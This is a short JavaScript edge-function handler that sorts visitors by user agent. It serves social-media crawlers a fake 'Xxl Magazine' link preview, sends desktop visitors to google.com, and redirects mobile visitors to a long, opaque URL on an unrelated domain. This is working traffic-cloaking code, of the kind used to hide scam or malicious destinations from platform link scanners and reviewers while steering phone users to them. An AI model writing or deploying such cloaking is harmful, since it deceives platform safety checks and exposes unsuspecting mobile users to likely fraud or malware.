export async function onRequest(context) {
  const request = context.request;
  const userAgent = request.headers.get('user-agent') || '';

  // 1. Check for Social Media Crawlers / Bots
  const isSocialBot = /facebookexternalhit|Facebot|Twitterbot|Pinterest|LinkedInBot|WhatsApp|TelegramBot/i.test(userAgent);

  if (isSocialBot) {
    const htmlContent = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
    <meta property="og:title" content="Xxl Magazine">
    <meta property="og:description" content="">
    <meta property="og:image" content="https://s3.us-east-2.amazonaws.com/img-utils-conversions.pixelied.com/conversions/Mon-Sep-07-2026/2dd1e746-455a-4b7f-809f-37a5f2ee443c/5c82af70-9fee-4d48-9a96-e067c525e7ef.avif">
    <meta property="og:url" content="https://www.google.com">
    <meta property="og:type" content="website">
</head>
<body>
</body>
</html>`;

    return new Response(htmlContent, {
      headers: { 'content-type': 'text/html;charset=UTF-8' },
    });
  }

  // 2. Check for Mobile Users
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);

  if (isMobile) {
    return Response.redirect("https://racialburgerdiverse.com/e8av4/qJGEuf5O/mJbyfXBqRL/Pwdyk/CfShYmCzU4/pblPRXVQ1gKvdNh-f93l/GdKm2e7v85dK8Q/Lk2Ao_TQfp/jB6uZKHsf3JABVbLS/dQi7kvSC2Fu4Op0/WUx2V297auOsVA", 302);
  } else {
    return Response.redirect("https://www.google.com", 302);
  }
}
